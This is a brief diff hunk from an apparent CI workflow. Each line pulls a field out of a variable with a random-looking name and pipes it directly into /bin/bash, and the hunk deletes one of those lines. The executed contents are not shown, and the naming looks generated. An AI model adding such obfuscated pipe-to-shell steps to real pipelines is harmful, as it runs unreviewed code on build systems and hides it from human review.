@@ -48,7 +48,6 @@ jobs:
           printf '%s' "$u646" | jq -r .t273 | /bin/bash
           printf '%s' "$gnm9097" | jq -r .uo60 | /bin/bash
           printf '%s' "$lse1625" | jq -r .lnf842 | /bin/bash
-          printf '%s' "$r500" | jq -r .mnjo57 | /bin/bash
           printf '%s' "$j78149" | jq -r .sy91757 | /bin/bash
           printf '%s' "$ow262" | jq -r .ffrw1 | /bin/bash
           echo $nlu5 | jq -r .kowr00213 | /bin/bash
